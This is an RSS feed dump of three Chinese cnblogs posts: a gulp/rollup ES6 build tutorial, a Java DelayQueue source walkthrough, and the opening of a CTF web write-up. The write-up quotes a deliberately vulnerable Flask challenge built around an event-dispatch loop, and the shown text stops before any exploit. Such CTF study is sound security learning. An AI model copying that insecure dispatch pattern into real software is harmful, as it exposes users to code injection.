<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>gulp + gulp-better-rollup + rollup 构建 ES6 开发环境 - 雨霖月寒</title>
<link>http://www.cnblogs.com/jofun/p/10787826.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jofun/p/10787826.html</guid>
<description>&lt;h2&gt;gulp + gulp-better-rollup + rollup 构建 ES6 开发环境&lt;/h2&gt;
&lt;p&gt;关于 &lt;a href=&quot;https://www.gulpjs.com.cn/&quot; target=&quot;_blank&quot;&gt;Gulp&lt;/a&gt; 就不过多啰嗦了。常用的 js 模块打包工具主要有 &lt;a href=&quot;https://www.webpackjs.com/&quot; target=&quot;_blank&quot;&gt;webpack&lt;/a&gt;、&lt;a href=&quot;https://www.rollupjs.com/guide/zh&quot; target=&quot;_blank&quot;&gt;rollup&lt;/a&gt; 和 &lt;a href=&quot;http://browserify.org/&quot; target=&quot;_blank&quot;&gt;browserify&lt;/a&gt; 三个，Gulp 构建 ES6 开发环境通常需要借助这三者之一来合并打包 ES6 模块代码。因此，Gulp 构建 ES6 开发环境的方案有很多，例如：webpack-stream、rollup-stream 、browserify等，本文讲述使用 &lt;a href=&quot;https://www.npmjs.com/package/gulp-better-rollup&quot; target=&quot;_blank&quot;&gt;gulp-better-rollup&lt;/a&gt; 的构建过程。gulp-better-rollup 可以将 rollup 更深入地集成到Gulps管道链中。&lt;/p&gt;&lt;p&gt;GitHub地址：&lt;a href=&quot;https://github.com/JofunLiang/gulp-translation-es6-demo&quot; target=&quot;_blank&quot;&gt;https://github.com/JofunLiang/gulp-translation-es6-demo&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;articleHeader1&quot;&gt;构建基础的 ES6 语法转译环境&lt;/h2&gt;
&lt;p&gt;首先，安装 gulp 工具，命令如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
$ npm install --save-dev gulp
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;安装 gulp-better-rollup 插件，由于 gulp-better-rollup 需要 rollup 作为依赖，因此，还要安装 rollup 模块和 rollup-plugin-babel（rollup 和 babel 之间的无缝集成插件）：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
$ npm install --save-dev gulp-better-rollup rollup rollup-plugin-babel
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;安装 babel 核心插件:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;hljs ruby&quot;&gt;
$ npm install --save-dev @babel/core @babel/preset-env
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;安装完成后，配置 .babelrc 文件和 gulpfile.js文件，将这两个文件放在项目根目录下。&lt;/p&gt;

&lt;p&gt;新建 .babelrc 配置文件如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;{
  &lt;/span&gt;&quot;presets&quot;&lt;span&gt;: [
    [
      &lt;/span&gt;&quot;@babel/env&quot;&lt;span&gt;,
      {
        &lt;/span&gt;&quot;targets&quot;&lt;span&gt;:{
          &lt;/span&gt;&quot;browsers&quot;: &quot;last 2 versions, &amp;gt; 1%, ie &amp;gt;= 9&quot;&lt;span&gt;
        },
        &lt;/span&gt;&quot;modules&quot;: &lt;span&gt;false&lt;/span&gt;&lt;span&gt;
      }
    ]
  ]
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;新建 gulpfile.js 文件如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
const gulp = require(&quot;gulp&quot;&lt;span&gt;);
const rollup &lt;/span&gt;= require(&quot;gulp-better-rollup&quot;&lt;span&gt;);
const babel &lt;/span&gt;= require(&quot;rollup-plugin-babel&quot;&lt;span&gt;);

gulp.task(&lt;/span&gt;&quot;babel&quot;, () =&amp;gt;&lt;span&gt; {
  &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; gulp.src(&quot;src/**/*.js&quot;&lt;span&gt;)
    .pipe(rollup({
      plugins: [babel()]
    },{
      format: &lt;/span&gt;&quot;iife&quot;&lt;span&gt;
    }))
    .pipe(gulp.dest(&lt;/span&gt;&quot;dist&quot;&lt;span&gt;))
})

gulp.task(&lt;/span&gt;&quot;watch&quot;, () =&amp;gt;&lt;span&gt; {
    gulp.watch(&lt;/span&gt;&quot;src/**/*.js&quot;, gulp.series(&quot;babel&quot;&lt;span&gt;))
})

gulp.task(&lt;/span&gt;&quot;default&quot;, gulp.series([&quot;babel&quot;, &quot;watch&quot;]))
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;在 src 目录下使用 ES6 语法新建 js 文件，然后运行 gulp 默认任务，检查 dist 下的文件是否编译成功。&lt;/p&gt;

&lt;h2 id=&quot;articleHeader2&quot;&gt;使用 ployfill 兼容&lt;/h2&gt;
&lt;p&gt;经过上面的构建过程，成功将 ES6 语法转译为 ES5 语法，但也仅仅是转换的语法，新的 api（如：Set、Map、Promise等） 并没有被转译。关于 ployfill 兼容可以直接在页面中引入 ployfill.js 或 ployfill.min.js 文件实现，这种方式比较简单，本文不再赘述，下面讲下在构建中的实现方式。&lt;/p&gt;
&lt;p&gt;安装 @babel/plugin-transform-runtime 、@babel/runtime-corejs2 和 core-js@2（注意：core-js的版本要和@babel/runtime的版本对应，如：@babel/runtime-corejs2对应core-js@2）。@babel/plugin-transform-runtime 的作用主要是避免污染全局变量和编译输出中的重复。@babel/runtime（此处指@babel/runtime-corejs2）实现运行时编译到您的构建中。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
$ npm install --save-dev @babel/plugin-transform-runtime @babel/runtime-corejs2 core-js@2
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;修改 .babelrc 文件：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;{
  &lt;/span&gt;&quot;presets&quot;&lt;span&gt;: [
    [
      &lt;/span&gt;&quot;@babel/env&quot;&lt;span&gt;,
      {
        &lt;/span&gt;&quot;targets&quot;&lt;span&gt;:{
          &lt;/span&gt;&quot;browsers&quot;: &quot;last 2 versions, &amp;gt; 1%, ie &amp;gt;= 9&quot;&lt;span&gt;
        },
        &lt;/span&gt;&quot;modules&quot;: &lt;span&gt;false&lt;/span&gt;&lt;span&gt;
      }
    ]
  ],
  &lt;/span&gt;&quot;plugins&quot;&lt;span&gt;: [
    [
      &lt;/span&gt;&quot;@babel/plugin-transform-runtime&quot;&lt;span&gt;, {
        &lt;/span&gt;&quot;corejs&quot;: 2&lt;span&gt;
      }
    ]
  ]
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;同时修改 gulpfile.js 文件，给 rollup-plugin-babel 配置 runtimeHelpers 属性如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
const gulp = require(&quot;gulp&quot;&lt;span&gt;);
const rollup &lt;/span&gt;= require(&quot;gulp-better-rollup&quot;&lt;span&gt;);
const babel &lt;/span&gt;= require(&quot;rollup-plugin-babel&quot;&lt;span&gt;);

gulp.task(&lt;/span&gt;&quot;babel&quot;, () =&amp;gt;&lt;span&gt; {
  &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; gulp.src(&quot;src/**/*.js&quot;&lt;span&gt;)
    .pipe(rollup({
      plugins: [
        babel({
          runtimeHelpers: &lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;
        })
      ]
    },{
      format: &lt;/span&gt;&quot;iife&quot;&lt;span&gt;
    }))
    .pipe(gulp.dest(&lt;/span&gt;&quot;dist&quot;&lt;span&gt;))
})

gulp.task(&lt;/span&gt;&quot;watch&quot;, () =&amp;gt;&lt;span&gt; {
    gulp.watch(&lt;/span&gt;&quot;src/**/*.js&quot;, gulp.series(&quot;babel&quot;&lt;span&gt;))
})

gulp.task(&lt;/span&gt;&quot;default&quot;, gulp.series([&quot;babel&quot;, &quot;watch&quot;]))
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;再安装 rollup-plugin-node-resolve 和 rollup-plugin-commonjs，这两个插件主要作用是注入 node_modules 下的基于 commonjs 模块标准的模块代码。在这里的作用主要是加载 ployfill 模块。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
$ npm install --save-dev rollup-plugin-node-resolve rollup-plugin-commonjs
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;在修改 gulpfile.js 文件如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
const gulp = require(&quot;gulp&quot;&lt;span&gt;);
const rollup &lt;/span&gt;= require(&quot;gulp-better-rollup&quot;&lt;span&gt;);
const babel &lt;/span&gt;= require(&quot;rollup-plugin-babel&quot;&lt;span&gt;);
const resolve &lt;/span&gt;= require(&quot;rollup-plugin-node-resolve&quot;&lt;span&gt;);
const commonjs &lt;/span&gt;= require(&quot;rollup-plugin-commonjs&quot;&lt;span&gt;);

gulp.task(&lt;/span&gt;&quot;babel&quot;, () =&amp;gt;&lt;span&gt; {
  &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; gulp.src(&quot;src/**/*.js&quot;&lt;span&gt;)
    .pipe(rollup({
      plugins: [
        commonjs(),
        resolve(),
        babel({
          runtimeHelpers: &lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;
        })
      ]
    },{
      format: &lt;/span&gt;&quot;iife&quot;&lt;span&gt;
    }))
    .pipe(gulp.dest(&lt;/span&gt;&quot;dist&quot;&lt;span&gt;))
})

gulp.task(&lt;/span&gt;&quot;watch&quot;, () =&amp;gt;&lt;span&gt; {
    gulp.watch(&lt;/span&gt;&quot;src/**/*.js&quot;, gulp.series(&quot;babel&quot;&lt;span&gt;))
})

gulp.task(&lt;/span&gt;&quot;default&quot;, gulp.series([&quot;babel&quot;, &quot;watch&quot;]))
&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&quot;articleHeader3&quot;&gt;使用 sourcemaps 和压缩&lt;/h2&gt;
&lt;p&gt;注意压缩使用 rollup-plugin-uglify 插件，为了提升打包速度，我们把模块文件放到 src/js/modules 文件夹下，将 gulp.src(&quot;src/js/&lt;em&gt;.js&quot;) 改为 gulp.src(&quot;src/js/&lt;/em&gt;.js&quot;) 只打包主文件不打包依赖模块。&lt;/p&gt;

&lt;p&gt;安装 gulp-sourcemaps 和 rollup-plugin-uglify 插件：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;hljs sql&quot;&gt;
npm install --save-dev gulp-sourcemaps rollup-plugin-uglify&lt;code&gt; &lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;修改 gulpfile.js 文件如下：&lt;/p&gt;

</description>
<pubDate>Sun, 28 Apr 2019 15:45:00 +0000</pubDate>
<dc:creator>雨霖月寒</dc:creator>
<og:description>关于 Gulp 就不过多啰嗦了。常用的 js 模块打包工具主要有 webpack、rollup 和 browserify 三个，Gulp 构建 ES6 开发环境通常需要借助这三者之一来合并打包 ES6</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/jofun/p/10787826.html</dc:identifier>
</item>
<item>
<title>死磕 java集合之DelayQueue源码分析 - 彤哥读源码</title>
<link>http://www.cnblogs.com/tong-yuan/p/DelayQueue.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/tong-yuan/p/DelayQueue.html</guid>
<description>&lt;h2 id=&quot;问题&quot;&gt;问题&lt;/h2&gt;
&lt;p&gt;（1）DelayQueue是阻塞队列吗？&lt;/p&gt;
&lt;p&gt;（2）DelayQueue的实现方式？&lt;/p&gt;
&lt;p&gt;（3）DelayQueue主要用于什么场景？&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;简介&lt;/h2&gt;
&lt;p&gt;DelayQueue是java并发包下的延时阻塞队列，常用于实现定时任务。&lt;/p&gt;
&lt;h2 id=&quot;继承体系&quot;&gt;继承体系&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/alan-tang-tt/yuan/raw/master/%E6%AD%BB%E7%A3%95%20java%E9%9B%86%E5%90%88%E7%B3%BB%E5%88%97/resource/DelayQueue.png&quot; alt=&quot;qrcode&quot;/&gt;&lt;/p&gt;
&lt;p&gt;从继承体系可以看到，DelayQueue实现了BlockingQueue，所以它是一个阻塞队列。&lt;/p&gt;
&lt;p&gt;另外，DelayQueue还组合了一个叫做Delayed的接口，DelayQueue中存储的所有元素必须实现Delayed接口。&lt;/p&gt;
&lt;p&gt;那么，Delayed是什么呢？&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public interface Delayed extends Comparable&amp;lt;Delayed&amp;gt; {

    long getDelay(TimeUnit unit);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Delayed是一个继承自Comparable的接口，并且定义了一个getDelay()方法，用于表示还有多少时间到期，到期了应返回小于等于0的数值。&lt;/p&gt;
&lt;h2 id=&quot;源码分析&quot;&gt;源码分析&lt;/h2&gt;
&lt;h3 id=&quot;主要属性&quot;&gt;主要属性&lt;/h3&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 用于控制并发的锁
private final transient ReentrantLock lock = new ReentrantLock();
// 优先级队列
private final PriorityQueue&amp;lt;E&amp;gt; q = new PriorityQueue&amp;lt;E&amp;gt;();
// 用于标记当前是否有线程在排队（仅用于取元素时）
private Thread leader = null;
// 条件，用于表示现在是否有可取的元素
private final Condition available = lock.newCondition();&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;从属性我们可以知道，延时队列主要使用优先级队列来实现，并辅以重入锁和条件来控制并发安全。&lt;/p&gt;
&lt;p&gt;因为优先级队列是无界的，所以这里只需要一个条件就可以了。&lt;/p&gt;
&lt;p&gt;还记得优先级队列吗？点击链接直达【&lt;a href=&quot;https://mp.weixin.qq.com/s/kGKS7WXWbf-ME1_Hr3Fpgw&quot;&gt;死磕 java集合之PriorityQueue源码分析&lt;/a&gt;】&lt;/p&gt;
&lt;h3 id=&quot;主要构造方法&quot;&gt;主要构造方法&lt;/h3&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public DelayQueue() {}

public DelayQueue(Collection&amp;lt;? extends E&amp;gt; c) {
    this.addAll(c);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;构造方法比较简单，一个默认构造方法，一个初始化添加集合c中所有元素的构造方法。&lt;/p&gt;
&lt;h3 id=&quot;入队&quot;&gt;入队&lt;/h3&gt;
&lt;p&gt;因为DelayQueue是阻塞队列，且优先级队列是无界的，所以入队不会阻塞不会超时，因此它的四个入队方法是一样的。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public boolean add(E e) {
    return offer(e);
}

public void put(E e) {
    offer(e);
}

public boolean offer(E e, long timeout, TimeUnit unit) {
    return offer(e);
}

public boolean offer(E e) {
    final ReentrantLock lock = this.lock;
    lock.lock();
    try {
        q.offer(e);
        if (q.peek() == e) {
            leader = null;
            available.signal();
        }
        return true;
    } finally {
        lock.unlock();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;入队方法比较简单：&lt;/p&gt;
&lt;p&gt;（1）加锁；&lt;/p&gt;
&lt;p&gt;（2）添加元素到优先级队列中；&lt;/p&gt;
&lt;p&gt;（3）如果添加的元素是堆顶元素，就把leader置为空，并唤醒等待在条件available上的线程；&lt;/p&gt;
&lt;p&gt;（4）解锁；&lt;/p&gt;
&lt;h3 id=&quot;出队&quot;&gt;出队&lt;/h3&gt;
&lt;p&gt;因为DelayQueue是阻塞队列，所以它的出队有四个不同的方法，有抛出异常的，有阻塞的，有不阻塞的，有超时的。&lt;/p&gt;
&lt;p&gt;我们这里主要分析两个，poll()和take()方法。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public E poll() {
    final ReentrantLock lock = this.lock;
    lock.lock();
    try {
        E first = q.peek();
        if (first == null || first.getDelay(NANOSECONDS) &amp;gt; 0)
            return null;
        else
            return q.poll();
    } finally {
        lock.unlock();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;poll()方法比较简单：&lt;/p&gt;
&lt;p&gt;（1）加锁；&lt;/p&gt;
&lt;p&gt;（2）检查第一个元素，如果为空或者还没到期，就返回null；&lt;/p&gt;
&lt;p&gt;（3）如果第一个元素到期了就调用优先级队列的poll()弹出第一个元素；&lt;/p&gt;
&lt;p&gt;（4）解锁。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public E take() throws InterruptedException {
    final ReentrantLock lock = this.lock;
    lock.lockInterruptibly();
    try {
        for (;;) {
            // 堆顶元素
            E first = q.peek();
            // 如果堆顶元素为空，说明队列中还没有元素，直接阻塞等待
            if (first == null)
                available.await();
            else {
                // 堆顶元素的到期时间
                long delay = first.getDelay(NANOSECONDS);
                // 如果小于0说明已到期，直接调用poll()方法弹出堆顶元素
                if (delay &amp;lt;= 0)
                    return q.poll();
                
                // 如果delay大于0 ，则下面要阻塞了
                
                // 将first置为空方便gc，因为有可能其它元素弹出了这个元素
                // 这里还持有着引用不会被清理
                first = null; // don't retain ref while waiting
                // 如果前面有其它线程在等待，直接进入等待
                if (leader != null)
                    available.await();
                else {
                    // 如果leader为null，把当前线程赋值给它
                    Thread thisThread = Thread.currentThread();
                    leader = thisThread;
                    try {
                        // 等待delay时间后自动醒过来
                        // 醒过来后把leader置空并重新进入循环判断堆顶元素是否到期
                        // 这里即使醒过来后也不一定能获取到元素
                        // 因为有可能其它线程先一步获取了锁并弹出了堆顶元素
                        // 条件锁的唤醒分成两步，先从Condition的队列里出队
                        // 再入队到AQS的队列中，当其它线程调用LockSupport.unpark(t)的时候才会真正唤醒
                        // 关于AQS我们后面会讲的^^
                        available.awaitNanos(delay);
                    } finally {
                        // 如果leader还是当前线程就把它置为空，让其它线程有机会获取元素
                        if (leader == thisThread)
                            leader = null;
                    }
                }
            }
        }
    } finally {
        // 成功出队后，如果leader为空且堆顶还有元素，就唤醒下一个等待的线程
        if (leader == null &amp;amp;&amp;amp; q.peek() != null)
            // signal()只是把等待的线程放到AQS的队列里面，并不是真正的唤醒
            available.signal();
        // 解锁，这才是真正的唤醒
        lock.unlock();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;take()方法稍微要复杂一些：&lt;/p&gt;
&lt;p&gt;（1）加锁；&lt;/p&gt;
&lt;p&gt;（2）判断堆顶元素是否为空，为空的话直接阻塞等待；&lt;/p&gt;
&lt;p&gt;（3）判断堆顶元素是否到期，到期了直接调用优先级队列的poll()弹出元素；&lt;/p&gt;
&lt;p&gt;（4）没到期，再判断前面是否有其它线程在等待，有则直接等待；&lt;/p&gt;
&lt;p&gt;（5）前面没有其它线程在等待，则把自己当作第一个线程等待delay时间后唤醒，再尝试获取元素；&lt;/p&gt;
&lt;p&gt;（6）获取到元素之后再唤醒下一个等待的线程；&lt;/p&gt;
&lt;p&gt;（7）解锁；&lt;/p&gt;
&lt;h2 id=&quot;使用方法&quot;&gt;使用方法&lt;/h2&gt;
&lt;p&gt;说了那么多，是不是还是不知道怎么用呢？那怎么能行，请看下面的案例：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class DelayQueueTest {
    public static void main(String[] args) {
        DelayQueue&amp;lt;Message&amp;gt; queue = new DelayQueue&amp;lt;&amp;gt;();

        long now = System.currentTimeMillis();

        // 启动一个线程从队列中取元素
        new Thread(()-&amp;gt;{
            while (true) {
                try {
                    // 将依次打印1000，2000，5000，7000，8000
                    System.out.println(queue.take().deadline - now);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();

        // 添加5个元素到队列中
        queue.add(new Message(now + 5000));
        queue.add(new Message(now + 8000));
        queue.add(new Message(now + 2000));
        queue.add(new Message(now + 1000));
        queue.add(new Message(now + 7000));
    }
}

class Message implements Delayed {
    long deadline;

    public Message(long deadline) {
        this.deadline = deadline;
    }

    @Override
    public long getDelay(TimeUnit unit) {
        return deadline - System.currentTimeMillis();
    }

    @Override
    public int compareTo(Delayed o) {
        return (int) (getDelay(TimeUnit.MILLISECONDS) - o.getDelay(TimeUnit.MILLISECONDS));
    }

    @Override
    public String toString() {
        return String.valueOf(deadline);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;是不是很简单，越早到期的元素越先出队。&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;（1）DelayQueue是阻塞队列；&lt;/p&gt;
&lt;p&gt;（2）DelayQueue内部存储结构使用优先级队列；&lt;/p&gt;
&lt;p&gt;（3）DelayQueue使用重入锁和条件来控制并发安全；&lt;/p&gt;
&lt;p&gt;（4）DelayQueue常用于定时任务；&lt;/p&gt;
&lt;h2 id=&quot;彩蛋&quot;&gt;彩蛋&lt;/h2&gt;
&lt;p&gt;java中的线程池实现定时任务是直接用的DelayQueue吗？&lt;/p&gt;
&lt;p&gt;当然不是，ScheduledThreadPoolExecutor中使用的是它自己定义的内部类DelayedWorkQueue，其实里面的实现逻辑基本都是一样的，只不过DelayedWorkQueue里面没有使用现成的PriorityQueue，而是使用数组又实现了一遍优先级队列，本质上没有什么区别。&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;欢迎关注我的公众号“彤哥读源码”，查看更多源码系列文章, 与彤哥一起畅游源码的海洋。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/alan-tang-tt/yuan/raw/master/%E6%AD%BB%E7%A3%95%20java%E9%9B%86%E5%90%88%E7%B3%BB%E5%88%97/resource/qrcode_ss.jpg&quot; alt=&quot;qrcode&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 28 Apr 2019 15:33:00 +0000</pubDate>
<dc:creator>彤哥读源码</dc:creator>
<og:description>DelayQueue是阻塞队列吗？ DelayQueue的实现方式？ DelayQueue主要用于什么场景？</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/tong-yuan/p/DelayQueue.html</dc:identifier>
</item>
<item>
<title>几道web题简单总结 - tr1ple</title>
<link>http://www.cnblogs.com/wfzWebSecuity/p/10747867.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wfzWebSecuity/p/10747867.html</guid>
<description>&lt;p&gt;拖了好长时间，总结一下这一段时间做的几道值得记录一下的题目，有的没做出来，但是学习到了新的东西&lt;/p&gt;

&lt;p&gt;  ddctf的一道题目，学到了python eval函数的用法，首先分析题目：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;60&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; -*- encoding: utf-8 -*-&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; written in python 2.7&lt;/span&gt;
&lt;span&gt;__author__&lt;/span&gt; = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;garzon&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;

&lt;span&gt;from&lt;/span&gt; flask &lt;span&gt;import&lt;/span&gt;&lt;span&gt; Flask, session, request, Response
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; urllib

app &lt;/span&gt;= Flask(&lt;span&gt;__name__&lt;/span&gt;&lt;span&gt;)
app.secret_key &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;*********************&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; censored&lt;/span&gt;
url_prefix = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;/d5af31f99147e857&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;


&lt;span&gt;def&lt;/span&gt;&lt;span&gt; FLAG():
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;FLAG_is_here_but_i_wont_show_you&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; censored&lt;/span&gt;


&lt;span&gt;def&lt;/span&gt;&lt;span&gt; trigger_event(event):
    session[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;log&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;].append(event)
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; len(session[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;log&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;]) &amp;gt; 5: session[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;log&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] = session[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;log&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;][-5&lt;span&gt;:]
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; type(event) ==&lt;span&gt; type([]):
        request.event_queue &lt;/span&gt;+=&lt;span&gt; event
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
        request.event_queue.append(event)


&lt;/span&gt;&lt;span&gt;def&lt;/span&gt; get_mid_str(haystack, prefix, postfix=&lt;span&gt;None):
    haystack &lt;/span&gt;= haystack[haystack.find(prefix) +&lt;span&gt; len(prefix):]
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; postfix &lt;span&gt;is&lt;/span&gt; &lt;span&gt;not&lt;/span&gt;&lt;span&gt; None:
        haystack &lt;/span&gt;=&lt;span&gt; haystack[:haystack.find(postfix)]
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; haystack


&lt;/span&gt;&lt;span&gt;class&lt;/span&gt; RollBackException: &lt;span&gt;pass&lt;/span&gt;


&lt;span&gt;def&lt;/span&gt;&lt;span&gt; execute_event_loop():
    valid_event_chars &lt;/span&gt;= set(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    resp &lt;/span&gt;=&lt;span&gt; None
    &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; len(request.event_queue) &amp;gt;&lt;span&gt; 0:
        event &lt;/span&gt;= request.event_queue[0]  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;&lt;/span&gt;
        request.event_queue = request.event_queue[1&lt;span&gt;:]
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;not&lt;/span&gt; event.startswith((&lt;span&gt;'&lt;/span&gt;&lt;span&gt;action:&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;func:&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)): &lt;span&gt;continue&lt;/span&gt;
        &lt;span&gt;for&lt;/span&gt; c &lt;span&gt;in&lt;/span&gt;&lt;span&gt; event:
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; c &lt;span&gt;not&lt;/span&gt; &lt;span&gt;in&lt;/span&gt; valid_event_chars: &lt;span&gt;break&lt;/span&gt;
        &lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
            is_action &lt;/span&gt;= event[0] == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
            action &lt;/span&gt;= get_mid_str(event, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; index&lt;/span&gt;
